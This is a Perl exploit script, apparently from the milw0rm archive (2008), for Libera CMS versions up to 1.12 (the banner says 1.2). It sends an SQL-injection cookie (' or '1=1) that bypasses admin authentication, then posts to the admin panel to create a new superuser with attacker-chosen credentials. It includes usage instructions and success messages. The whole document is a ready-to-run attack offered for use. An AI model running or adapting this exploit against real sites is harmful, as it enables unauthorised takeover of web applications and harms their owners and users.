#!/usr/bin/perl
 # ----------------------------------------------------------
 # Libera CMS <= 1.12 (Cookie) Remote SQL Injection Exploit
 # Perl Exploit - Add a new admin with your credentials!
 # Author: StAkeR - StAkeR[at]hotmail[dot]it
 # ----------------------------------------------------------
 # Usage: perl http://localhost/cms StAkeR obscure
 # ----------------------------------------------------------

 use strict;
 use LWP::UserAgent;

 my ($hostname,$username,$password) = @ARGV;
 my $request  = undef;
 my $http_s   = new LWP::UserAgent or die $!;

 $hostname = ($hostname =~ /^http:\/\/(.+?)$/) ? $ARGV[0] : banner();
 banner() unless $username and $password;

 $http_s->agent("Mozilla/4.5 [en] (Win95; U)");
 $http_s->timeout(1);
 $http_s->default_header('Cookie' => "libera_staff_pass=' or '1=1");

 $request = $http_s->post($hostname."/admin.php?action=add_user_process",
                         [
                          username       => $username,
                          password       => $password,
                          password_again => $password,
                          email          => 0,
                          su             => 1,
                          submit         => "Add+User"
                        ]);

 if($request->is_success)
 {
   if($request->content =~ /added successfully/i)
   {
     print "[+] Exploit Done!\n";
     print "[+] Added New Administrator:\n\n";
     print "[+] Username: ${username}\n";
     print "[+] Password: ${password}\n";
   }
   else
   {
     print "[!] Exploit Failed!\n";
     print "[!] Site Not Vulnerable\n";
   }
 }


 sub banner
 {
   print "[+] Libera CMS <= 1.2 Remote SQL Injection Exploit (add new admin)\n";
   print "[+] Usage: perl exploit.pl [host] [username] [password]\n";
   print "[+] Example: perl exploit.pl http://localhost/cms StAkeR obscure\n\n";
   return exit;
 }

# milw0rm.com [2008-09-10]